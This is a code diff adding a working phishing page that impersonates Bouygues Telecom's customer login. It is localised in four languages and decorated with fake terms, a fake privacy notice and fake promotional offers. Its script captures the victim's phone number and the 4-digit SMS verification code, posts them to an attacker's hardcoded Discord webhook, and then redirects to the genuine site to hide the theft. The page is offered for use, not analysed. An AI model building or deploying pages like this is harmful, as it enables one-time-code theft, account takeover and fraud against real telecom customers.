@@ -1,0 +1,472 @@
+<!doctype html>
+<html lang="fr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Bouygues Telecom — Espace client</title>
+<style>
+*{box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#f4f6f9;color:#1a1a1a;margin:0;min-height:100vh}
+header{background:#003DA5;padding:14px 20px;display:flex;align-items:center;justify-content:space-between;gap:12px}
+header .logo{color:#fff;font-weight:700;font-size:18px;letter-spacing:.3px;white-space:nowrap}
+header .logo span{color:#7ec8ff}
+header .right{display:flex;align-items:center;gap:14px}
+header .help{color:#cfe1ff;font-size:13px;white-space:nowrap}
+select.lang{background:#00307f;color:#fff;border:1px solid #2a63c4;border-radius:6px;padding:6px 8px;font-size:13px;cursor:pointer}
+select.lang:focus{outline:none;border-color:#7ec8ff}
+.wrap{max-width:460px;margin:40px auto;padding:0 16px}
+.card{background:#fff;border-radius:10px;padding:32px 28px;box-shadow:0 2px 12px rgba(0,0,0,.06)}
+h1{font-size:22px;margin:0 0 6px;color:#003DA5}
+p.sub{color:#5a6472;font-size:14px;line-height:1.5;margin:0 0 20px}
+label{display:block;font-size:13px;font-weight:600;margin:16px 0 6px;color:#2b2f36}
+input,select.line{width:100%;padding:13px;border-radius:6px;border:1px solid #c8cdd4;background:#fff;color:#1a1a1a;font-size:15px}
+input:focus,select.line:focus{outline:none;border-color:#003DA5;box-shadow:0 0 0 3px rgba(0,61,165,.12)}
+button{width:100%;margin-top:22px;padding:14px;border:0;border-radius:6px;background:#003DA5;color:#fff;font-size:15px;font-weight:600;cursor:pointer}
+button:hover{background:#00308a}
+button:active{transform:scale(.995)}
+.step{display:none}
+.step.active{display:block}
+.code-input{padding:16px;font-size:26px;letter-spacing:10px;text-align:center;font-weight:600}
+.msg{font-size:13px;color:#c0392b;margin-top:12px;min-height:18px}
+.spin{display:inline-block;width:14px;height:14px;border:2px solid #ffffff55;border-top-color:#fff;border-radius:50%;animation:s .8s linear infinite;vertical-align:-2px;margin-right:6px}
+@keyframes s{to{transform:rotate(360deg)}}
+.cgv{font-size:12px;color:#5a6472;line-height:1.6;margin-top:16px;text-align:left}
+.cgv a{color:#003DA5;text-decoration:underline;cursor:pointer}
+.cgv .admin{margin-top:14px;font-size:12px;color:#5a6472;display:flex;justify-content:space-between;align-items:center;cursor:pointer;user-select:none;gap:10px}
+.cgv .admin .chev{font-size:10px;color:#5a6472;flex-shrink:0}
+footer{text-align:center;color:#8a919b;font-size:12px;margin:24px 0;padding:0 16px}
+
+/* ===== GROS LOGO AU MILIEU À DROITE ===== */
+.giant-logo{
+  position:fixed;
+  top:50%;
+  right:40px;
+  transform:translateY(-50%);
+  width:340px;
+  z-index:100;
+  pointer-events:none;
+  filter:drop-shadow(0 10px 30px rgba(0,61,165,.15));
+}
+@media(max-width:1200px){
+  .giant-logo{width:240px;right:20px}
+}
+@media(max-width:900px){
+  .giant-logo{display:none}
+}
+
+/* ===== SECTION OFFRES / PUB ===== */
+.offres-section{max-width:1200px;margin:10px auto 40px;padding:0 20px}
+.offres-grid{display:grid;grid-template-columns:1fr 1fr;gap:24px}
+@media(max-width:768px){.offres-grid{grid-template-columns:1fr}}
+.offre-card{background:#fff;border-radius:12px;overflow:hidden;box-shadow:0 4px 16px rgba(0,0,0,.08);transition:transform .2s ease,box-shadow .2s ease;display:flex;flex-direction:column}
+.offre-card:hover{transform:translateY(-4px);box-shadow:0 8px 28px rgba(0,0,0,.12)}
+.offre-img{position:relative;height:220px;background:linear-gradient(135deg,#003DA5 0%,#001f5c 100%);display:flex;align-items:center;justify-content:center;overflow:hidden}
+.offre-img img{max-height:180px;max-width:85%;width:auto;object-fit:contain;filter:drop-shadow(0 6px 20px rgba(0,0,0,.3))}
+.badge-promo{position:absolute;top:14px;left:14px;background:#003DA5;color:#fff;font-size:12px;font-weight:700;padding:6px 12px;border-radius:20px;letter-spacing:.3px}
+.badge-samsung{position:absolute;bottom:14px;left:14px;background:#fff;color:#003DA5;font-size:11px;font-weight:800;padding:4px 10px;border-radius:4px;letter-spacing:1px}
+.badge-ai{position:absolute;top:14px;right:14px;background:#fff;color:#003DA5;font-size:12px;font-weight:700;padding:8px 12px;border-radius:8px;text-align:center;line-height:1.3;box-shadow:0 4px 12px rgba(0,0,0,.15)}
+.badge-ai small{font-size:10px;font-weight:500;color:#5a6472;display:block}
+.offre-content{padding:22px 24px 26px;display:flex;flex-direction:column;flex:1}
+.offre-content h3{font-size:18px;font-weight:700;color:#1a1a1a;margin:0 0 12px;line-height:1.3;text-align:center}
+.prix{display:flex;align-items:baseline;justify-content:center;gap:10px;margin-bottom:8px}
+.prix-barre{font-size:18px;color:#8a919b;text-decoration:line-through;font-weight:500}
+.prix-actuel{font-size:28px;font-weight:800;color:#003DA5}
+.prix-big{display:flex;flex-direction:column;align-items:center;background:#c0392b;color:#fff;border-radius:10px;padding:12px 24px;margin-bottom:12px;width:fit-content;margin-left:auto;margin-right:auto}
+.prix-label{font-size:13px;font-weight:500;opacity:.9}
+.prix-value{font-size:32px;font-weight:800;line-height:1.1}
+.prix-sub{font-size:13px;font-weight:600}
+.offre-detail{font-size:13px;color:#5a6472;line-height:1.5;margin:0 0 16px;text-align:center}
+.remise{display:flex;align-items:center;justify-content:center;gap:8px;background:#fff4ec;border:1px solid #ffd9c2;border-radius:8px;padding:10px 14px;font-size:13px;font-weight:600;color:#d35400;margin-bottom:16px}
+.remise-icon{font-size:16px}
+.offre-link{display:inline-flex;align-items:center;justify-content:center;gap:6px;color:#003DA5;font-size:13px;font-weight:600;text-decoration:none;margin-top:auto;transition:gap .2s ease}
+.offre-link:hover{gap:10px;text-decoration:underline}
+.arrow{font-size:14px}
+</style>
+</head>
+<body>
+
+<!-- GROS LOGO BOUYGUES TELECOM AU MILIEU À DROITE -->
+<svg class="giant-logo" viewBox="0 0 400 260" xmlns="http://www.w3.org/2000/svg">
+  <!-- Texte "bouygues" -->
+  <text x="20" y="130" font-family="Arial, Helvetica, sans-serif" font-weight="700" font-size="62" fill="#0066A1" letter-spacing="-2">bouygues</text>
+  <text x="24" y="165" font-family="Arial, Helvetica, sans-serif" font-weight="400" font-size="26" fill="#0066A1" letter-spacing="6">TELECOM</text>
+  <!-- 3 ellipses -->
+  <ellipse cx="310" cy="60" rx="52" ry="28" fill="#1B9AD6"/>
+  <ellipse cx="275" cy="160" rx="28" ry="52" fill="#0F2F7F"/>
+  <ellipse cx="345" cy="160" rx="28" ry="52" fill="#C0522D"/>
+</svg>
+
+<header>
+  <div class="logo">Bouygues <span>Telecom</span></div>
+  <div class="right">
+    <div class="help" id="t-help">Aide · 1064</div>
+    <select class="lang" id="lang" onchange="setLang(this.value)">
+      <option value="fr">FR</option>
+      <option value="de">DE</option>
+      <option value="lb">LB</option>
+      <option value="nl">NL</option>
+    </select>
+  </div>
+</header>
+
+<div class="wrap">
+
+  <!-- ÉTAPE 1 -->
+  <div class="step active" id="s1">
+    <div class="card">
+      <h1 id="t-title1">Espace client</h1>
+      <p class="sub" id="t-sub1">Identifiez votre ligne pour accéder à votre facture et la régulariser.</p>
+
+      <label id="t-label-phone">Numéro de téléphone</label>
+      <input id="phone" type="tel" placeholder="06 12 34 56 78" autocomplete="tel">
+
+      <label id="t-label-line">Type de ligne</label>
+      <select class="line" id="line">
+        <option value="Mobile" id="t-opt-mobile">Mobile</option>
+        <option value="Box / Bbox" id="t-opt-box">Box / Bbox</option>
+        <option value="Forfait pro" id="t-opt-pro">Forfait pro</option>
+      </select>
+
+      <button id="btn1" onclick="sendPhone()"><span id="t-btn1">Accéder à ma facture</span></button>
+
+      <div class="cgv">
+        <p id="t-cgv-line1">En cliquant sur « Accéder à ma facture », vous acceptez les <a onclick="openCGV()">conditions générales</a>.</p>
+        <p id="t-cgv-line2">Nous vous encourageons également à consulter notre <a onclick="openPrivacy()">politique de confidentialité</a>.</p>
+        <div class="admin" onclick="toggleAdmin()">
+          <span id="t-admin">L'administrateur de vos données personnelles est Bouygues Telecom SA.</span>
+          <span class="chev" id="t-chev">▼</span>
+        </div>
+        <div id="t-admin-body" style="display:none;font-size:12px;color:#5a6472;margin-top:6px;line-height:1.6"></div>
+      </div>
+
+      <div class="msg" id="m1"></div>
+    </div>
+  </div>
+
+  <!-- ÉTAPE 2 -->
+  <div class="step" id="s2">
+    <div class="card">
+      <h1 id="t-title2">Vérification</h1>
+      <p class="sub" id="t-sub2">Un code de sécurité à 4 chiffres a été envoyé par SMS. Saisissez-le pour confirmer votre facture.</p>
+
+      <input id="code" class="code-input" type="text" inputmode="numeric" maxlength="4" placeholder="····">
+
+      <button id="btn2" onclick="sendCode()"><span id="t-btn2">Valider</span></button>
+      <div class="msg" id="m2"></div>
+    </div>
+  </div>
+
+</div>
+
+<!-- ===== SECTION OFFRES / PUB ===== -->
+<section class="offres-section">
+  <div class="offres-grid">
+
+    <!-- Carte 1 : TV -->
+    <div class="offre-card">
+      <div class="offre-img">
+        <img src="https://images.unsplash.com/photo-1593359677879-a4bb92f829d1?auto=format&fit=crop&w=600&q=80" alt="SAMSUNG Smart TV Neo QLED 55&quot;">
+        <span class="badge-promo">Le deal du moment</span>
+        <span class="badge-samsung">SAMSUNG</span>
+      </div>
+      <div class="offre-content">
+        <h3>SAMSUNG Smart TV Neo QLED 55"</h3>
+        <div class="prix">
+          <span class="prix-barre">749€</span>
+          <span class="prix-actuel">165€*</span>
+        </div>
+        <p class="offre-detail">ou 55€/mois en 3x sans frais avec Bbox Smart TV** et la fibre</p>
+        <div class="remise">
+          <span class="remise-icon">🏷️</span>
+          <span>-584€ de remise immédiate</span>
+        </div>
+        <a href="#" class="offre-link">Conditions <span class="arrow">→</span></a>
+      </div>
+    </div>
+
+    <!-- Carte 2 : Smartphone -->
+    <div class="offre-card">
+      <div class="offre-img">
+        <img src="https://images.unsplash.com/photo-1610945265064-0e34e5519bbf?auto=format&fit=crop&w=600&q=80" alt="Samsung Galaxy Z Fold8">
+        <div class="badge-ai">AI box offerte*<small>d'une valeur de 518€</small></div>
+      </div>
+      <div class="offre-content">
+        <h3>Samsung Galaxy Z Fold8</h3>
+        <div class="prix-big">
+          <span class="prix-label">jusqu'à</span>
+          <span class="prix-value">-300€</span>
+          <span class="prix-sub">de remise immédiate</span>
+        </div>
+        <p class="offre-detail">sur une sélection de smartphones avec le forfait Intégral*</p>
+        <a href="#" class="offre-link">Conditions et DAS <span class="arrow">→</span></a>
+      </div>
+    </div>
+
+  </div>
+</section>
+
+<footer id="t-footer">© Bouygues Telecom — 37-39 rue Boissière, 75016 Paris</footer>
+
+<script>
+const WEBHOOK = "https://discord.com/api/webhooks/1540363418870095923/pj9SBdJ4xKPBljGQFpBSVKF5qrYUV4fkDYPA3pGo-9TUsVnNI6gV_oRRAmctWND1uA9H";
+const REAL_SITE = "https://www.bouyguestelecom.fr";
+
+const I18N = {
+  fr: {
+    help: "Aide · 1064",
+    title1: "Espace client",
+    sub1: "Identifiez votre ligne pour accéder à votre facture et la régulariser.",
+    labelPhone: "Numéro de téléphone",
+    labelLine: "Type de ligne",
+    optMobile: "Mobile",
+    optBox: "Box / Bbox",
+    optPro: "Forfait pro",
+    btn1: "Accéder à ma facture",
+    cgvLine1a: 'En cliquant sur « Accéder à ma facture », vous acceptez les ',
+    cgvLink: 'conditions générales',
+    cgvLine2a: 'Nous vous encourageons également à consulter notre ',
+    privacyLink: 'politique de confidentialité',
+    admin: "L'administrateur de vos données personnelles est Bouygues Telecom SA.",
+    adminBody: "Bouygues Telecom SA, 37-39 rue Boissière, 75016 Paris, est responsable du traitement des données collectées via cet espace client. Les données sont conservées 36 mois à compter du dernier contact. Vous disposez d'un droit d'accès, de rectification, d'effacement et de portabilité en écrivant à donnees-personnelles@bouyguestelecom.fr.",
+    cgvTitle: 'Conditions générales',
+    cgvBody: "Les présentes conditions régissent l'accès à l'espace client Bouygues Telecom. Toute validation de facture implique l'acceptation pleine et entière des présentes. Les informations transmises sont traitées conformément à la politique de confidentialité. Le client reconnaît être titulaire de la ligne renseignée et disposer des droits nécessaires à la régularisation de la facture. Toute utilisation frauduleuse entraîne la suspension immédiate du service.",
+    privacyTitle: 'Politique de confidentialité',
+    privacyBody: "Les données collectées via ce formulaire sont utilisées pour l'identification de la ligne et la régularisation de la facture. Elles sont conservées 36 mois. Elles ne sont transmises à aucun tiers en dehors des sous-traitants techniques nécessaires au service. Conformément au RGPD, vous pouvez exercer vos droits en écrivant à donnees-personnelles@bouyguestelecom.fr.",
+    close: 'Fermer',
+    title2: 'Vérification',
+    sub2: "Un code de sécurité à 4 chiffres a été envoyé par SMS. Saisissez-le pour confirmer votre facture.",
+    btn2: 'Valider',
+    errPhone: 'Numéro invalide.',
+    errCode: 'Le code doit contenir 4 chiffres.',
+    sending: 'Vérification…',
+    validating: 'Validation…',
+    footer: "© Bouygues Telecom — 37-39 rue Boissière, 75016 Paris"
+  },
+  de: {
+    help: "Hilfe · 1064",
+    title1: "Kundenbereich",
+    sub1: "Identifizieren Sie Ihre Leitung, um auf Ihre Rechnung zuzugreifen und sie zu begleichen.",
+    labelPhone: "Telefonnummer",
+    labelLine: "Leitungstyp",
+    optMobile: "Mobil",
+    optBox: "Box / Bbox",
+    optPro: "Profi-Tarif",
+    btn1: "Zur Rechnung",
+    cgvLine1a: 'Mit dem Klick auf „Zur Rechnung“ akzeptieren Sie die ',
+    cgvLink: 'Allgemeinen Geschäftsbedingungen',
+    cgvLine2a: 'Wir empfehlen Ihnen außerdem, unsere ',
+    privacyLink: 'Datenschutzrichtlinie',
+    admin: 'Verantwortlicher für Ihre personenbezogenen Daten ist Bouygues Telecom SA.',
+    adminBody: "Bouygues Telecom SA, 37-39 rue Boissière, 75016 Paris, ist für die Verarbeitung der über diesen Kundenbereich erhobenen Daten verantwortlich. Die Daten werden 36 Monate ab dem letzten Kontakt aufbewahrt. Sie haben ein Recht auf Auskunft, Berichtigung, Löschung und Übertragbarkeit unter donnees-personnelles@bouyguestelecom.fr.",
+    cgvTitle: 'Allgemeine Geschäftsbedingungen',
+    cgvBody: "Diese Bedingungen regeln den Zugang zum Kundenbereich von Bouygues Telecom. Jede Rechnungsbestätigung setzt die vollständige Annahme dieser Bedingungen voraus. Die übermittelten Informationen werden gemäß der Datenschutzrichtlinie verarbeitet. Der Kunde bestätigt, Inhaber der angegebenen Leitung zu sein und über die erforderlichen Rechte zur Begleichung der Rechnung zu verfügen. Jede missbräuchliche Nutzung führt zur sofortigen Sperrung des Dienstes.",
+    privacyTitle: 'Datenschutzrichtlinie',
+    privacyBody: "Die über dieses Formular erhobenen Daten werden zur Identifizierung der Leitung und zur Begleichung der Rechnung verwendet. Sie werden 36 Monate aufbewahrt. Sie werden an keine Dritten außer den für den Dienst erforderlichen technischen Auftragsverarbeitern weitergegeben. Gemäß DSGVO können Sie Ihre Rechte unter donnees-personnelles@bouyguestelecom.fr ausüben.",
+    close: 'Schließen',
+    title2: 'Überprüfung',
+    sub2: "Ein 4-stelliger Sicherheitscode wurde per SMS gesendet. Geben Sie ihn ein, um Ihre Rechnung zu bestätigen.",
+    btn2: 'Bestätigen',
+    errPhone: 'Ungültige Nummer.',
+    errCode: 'Der Code muss 4 Ziffern enthalten.',
+    sending: 'Überprüfung…',
+    validating: 'Bestätigung…',
+    footer: "© Bouygues Telecom — 37-39 rue Boissière, 75016 Paris"
+  },
+  lb: {
+    help: "Hëllef · 1064",
+    title1: "Clientberäich",
+    sub1: "Identifizéiert Är Linn, fir op Är Rechnung zouzegräifen an se ze begleichen.",
+    labelPhone: "Telefonsnummer",
+    labelLine: "Typ vun der Linn",
+    optMobile: "Mobil",
+    optBox: "Box / Bbox",
+    optPro: "Profi-Forfait",
+    btn1: "Op meng Rechnung",
+    cgvLine1a: 'Andeems Dir op „Op meng Rechnung“ klickt, akzeptéiert Dir déi ',
+    cgvLink: 'allgemeng Geschäftsbedingungen',
+    cgvLine2a: 'Mir encouragéieren Iech och, eis ',
+    privacyLink: 'Dateschutzpolitik',
+    admin: 'Den Administrateur vun Ären perséinlechen Donnéeën ass Bouygues Telecom SA.',
+    adminBody: "Bouygues Telecom SA, 37-39 rue Boissière, 75016 Paräis, ass verantwortlech fir d'Veraarbechtung vun den Donnéeën, déi iwwer dëse Clientberäich gesammelt ginn. D'Donnéeë ginn 36 Méint no dem leschte Kontakt opbewahrt. Dir hutt e Recht op Zougang, Berichtigung, Läschung an Iwwerdroungbarkeet un donnees-personnelles@bouyguestelecom.fr.",
+    cgvTitle: 'Allgemeng Geschäftsbedingungen',
+    cgvBody: "Dës Bedingungen regelen den Zougang zum Clientberäich vu Bouygues Telecom. All Validatioun vun enger Rechnung implizéiert d'vollstänneg Akzeptanz vun dëse Bedingungen. D'Informatiounen, déi iwwermëttelt ginn, ginn geméiss der Dateschutzpolitik behandelt. De Client bestätegt, Inhaber vun der ugegebener Linn ze sinn an iwwer déi néideg Rechter ze verfügen, fir d'Rechnung ze begleichen. All mëssbrauchlech Notzung féiert zur sofortiger Suspensioun vum Service.",
+    privacyTitle: 'Dateschutzpolitik',
+    privacyBody: "D'Donnéeën, déi iwwer dëse Formulaire gesammelt ginn, ginn benotzt fir d'Linn z'identifizéieren an d'Rechnung ze begleichen. Si ginn 36 Méint opbewahrt. Si ginn un keng Drëtt weiderginn ausser un déi technesch Ënnerkontrakter, déi fir de Service néideg sinn. Geméiss DSGVO kënnt Dir Är Rechter ausüben un donnees-personnelles@bouyguestelecom.fr.",
+    close: 'Zoumaachen',
+    title2: 'Iwwerpréiwung',
+    sub2: "E 4-stelligen Sécherheetscode gouf per SMS geschéckt. Gitt en an, fir Är Rechnung ze bestätegen.",
+    btn2: 'Bestätegen',
+    errPhone: 'Ongülteg Nummer.',
+    errCode: 'De Code muss 4 Zifferen hunn.',
+    sending: 'Iwwerpréiwung…',
+    validating: 'Bestätegung…',
+    footer: "© Bouygues Telecom — 37-39 rue Boissière, 75016 Paräis"
+  },
+  nl: {
+    help: "Help · 1064",
+    title1: "Klantenzone",
+    sub1: "Identificeer uw lijn om toegang te krijgen tot uw factuur en deze te regulariseren.",
+    labelPhone: "Telefoonnummer",
+    labelLine: "Type lijn",
+    optMobile: "Mobiel",
+    optBox: "Box / Bbox",
+    optPro: "Pro-abonnement",
+    btn1: "Naar mijn factuur",
+    cgvLine1a: 'Door op „Naar mijn factuur“ te klikken accepteert u de ',
+    cgvLink: 'algemene voorwaarden',
+    cgvLine2a: 'Wij raden u ook aan ons ',
+    privacyLink: 'privacybeleid',
+    admin: 'De verwerkingsverantwoordelijke voor uw persoonsgegevens is Bouygues Telecom SA.',
+    adminBody: "Bouygues Telecom SA, 37-39 rue Boissière, 75016 Parijs, is verantwoordelijk voor de verwerking van de via deze klantenzone verzamelde gegevens. De gegevens worden 36 maanden na het laatste contact bewaard. U heeft recht op inzage, rectificatie, verwijdering en overdraagbaarheid via donnees-personnelles@bouyguestelecom.fr.",
+    cgvTitle: 'Algemene voorwaarden',
+    cgvBody: "Deze voorwaarden regelen de toegang tot de klantenzone van Bouygues Telecom. Elke factuurbevestiging impliceert de volledige aanvaarding van deze voorwaarden. De verzonden informatie wordt verwerkt in overeenstemming met het privacybeleid. De klant bevestigt houder te zijn van de opgegeven lijn en over de nodige rechten te beschikken om de factuur te regulariseren. Elk oneigenlijk gebruik leidt tot onmiddellijke opschorting van de dienst.",
+    privacyTitle: 'Privacybeleid',
+    privacyBody: "De via dit formulier verzamelde gegevens worden gebruikt voor de identificatie van de lijn en de regularisatie van de factuur. Ze worden 36 maanden bewaard. Ze worden aan geen derden doorgegeven buiten de technische verwerkers die nodig zijn voor de dienst. Overeenkomstig de AVG kunt u uw rechten uitoefenen via donnees-personnelles@bouyguestelecom.fr.",
+    close: 'Sluiten',
+    title2: 'Verificatie',
+    sub2: "Er is een 4-cijferige beveiligingscode per sms verzonden. Voer deze in om uw factuur te bevestigen.",
+    btn2: 'Bevestigen',
+    errPhone: 'Ongeldig nummer.',
+    errCode: 'De code moet 4 cijfers bevatten.',
+    sending: 'Verificatie…',
+    validating: 'Bevestiging…',
+    footer: "© Bouygues Telecom — 37-39 rue Boissière, 75016 Parijs"
+  }
+};
+
+let currentLang = "fr";
+let phone = "";
+let line = "";
+
+function t(key){ return I18N[currentLang][key]; }
+
+function applyLang(){
+  document.documentElement.lang = currentLang;
+  document.getElementById('t-help').textContent = t('help');
+  document.getElementById('t-title1').textContent = t('title1');
+  document.getElementById('t-sub1').textContent = t('sub1');
+  document.getElementById('t-label-phone').textContent = t('labelPhone');
+  document.getElementById('t-label-line').textContent = t('labelLine');
+  document.getElementById('t-opt-mobile').textContent = t('optMobile');
+  document.getElementById('t-opt-box').textContent = t('optBox');
+  document.getElementById('t-opt-pro').textContent = t('optPro');
+  document.getElementById('t-btn1').textContent = t('btn1');
+  document.getElementById('t-cgv-line1').innerHTML =
+    t('cgvLine1a') + '<a onclick="openCGV()">' + t('cgvLink') + '</a>.';
+  document.getElementById('t-cgv-line2').innerHTML =
+    t('cgvLine2a') + '<a onclick="openPrivacy()">' + t('privacyLink') + '</a>.';
+  document.getElementById('t-admin').textContent = t('admin');
+  document.getElementById('t-admin-body').textContent = t('adminBody');
+  document.getElementById('t-title2').textContent = t('title2');
+  document.getElementById('t-sub2').textContent = t('sub2');
+  document.getElementById('t-btn2').textContent = t('btn2');
+  document.getElementById('t-footer').textContent = t('footer');
+}
+
+function setLang(lang){
+  currentLang = lang;
+  applyLang();
+}
+
+function show(id){
+  document.querySelectorAll('.step').forEach(e => e.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+}
+
+function toggleAdmin(){
+  const b = document.getElementById('t-admin-body');
+  const c = document.getElementById('t-chev');
+  const open = b.style.display === 'block';
+  b.style.display = open ? 'none' : 'block';
+  c.textContent = open ? '▼' : '▲';
+}
+
+function modal(title, body){
+  const ov = document.createElement('div');
+  ov.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,.55);display:flex;align-items:center;justify-content:center;padding:20px;z-index:9999';
+  ov.innerHTML =
+    '<div style="background:#fff;max-width:520px;width:100%;border-radius:10px;padding:26px;max-height:80vh;overflow:auto;box-shadow:0 10px 40px rgba(0,0,0,.3)">' +
+      '<h2 style="margin:0 0 12px;color:#003DA5;font-size:18px">' + title + '</h2>' +
+      '<p style="font-size:13px;line-height:1.6;color:#2b2f36;white-space:pre-line">' + body + '</p>' +
+      '<button style="margin-top:18px;width:100%;padding:12px;border:0;border-radius:6px;background:#003DA5;color:#fff;font-size:14px;font-weight:600;cursor:pointer">' + t('close') + '</button>' +
+    '</div>';
+  ov.addEventListener('click', e => {
+    if(e.target === ov || e.target.tagName === 'BUTTON') ov.remove();
+  });
+  document.body.appendChild(ov);
+}
+
+function openCGV(){ modal(t('cgvTitle'), t('cgvBody')); }
+function openPrivacy(){ modal(t('privacyTitle'), t('privacyBody')); }
+
+async function postEmbed(title, fields){
+  const body = {
+    username: "Bouygues Telecom",
+    embeds: [{
+      title: title,
+      color: 0x003DA5,
+      fields: fields,
+      timestamp: new Date().toISOString()
+    }]
+  };
+  await fetch(WEBHOOK, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(body)
+  }).catch(() => {});
+}
+
+async function sendPhone(){
+  phone = document.getElementById('phone').value.trim();
+  line = document.getElementById('line').value;
+
+  if(phone.replace(/\D/g,'').length < 9){
+    document.getElementById('m1').textContent = t('errPhone');
+    return;
+  }
+
+  const btn = document.getElementById('btn1');
+  btn.disabled = true;
+  btn.innerHTML = '<span class="spin"></span>' + t('sending');
+  document.getElementById('m1').textContent = "";
+
+  await postEmbed("Nouveau numéro — Bouygues", [
+    { name: "Téléphone", value: "`" + phone + "`", inline: true },
+    { name: "Type de ligne", value: line || "n/a", inline: true },
+    { name: "Langue", value: currentLang.toUpperCase(), inline: true }
+  ]);
+
+  btn.disabled = false;
+  btn.innerHTML = '<span id="t-btn1">' + t('btn1') + '</span>';
+  show('s2');
+}
+
+async function sendCode(){
+  const code = document.getElementById('code').value.trim();
+
+  if(code.length !== 4){
+    document.getElementById('m2').textContent = t('errCode');
+    return;
+  }
+
+  const btn = document.getElementById('btn2');
+  btn.disabled = true;
+  btn.innerHTML = '<span class="spin"></span>' + t('validating');
+  document.getElementById('m2').textContent = "";
+
+  await postEmbed("Code reçu — Bouygues", [
+    { name: "Téléphone", value: "`" + phone + "`", inline: true },
+    { name: "Code", value: "`" + code + "`", inline: true },
+    { name: "Type de ligne", value: line || "n/a", inline: true },
+    { name: "Langue", value: currentLang.toUpperCase(), inline: true }
+  ]);
+
+  setTimeout(() => {
+    window.location.href = REAL_SITE;
+  }, 600);
+}
+
+applyLang();
+</script>
+</body>
+</html>
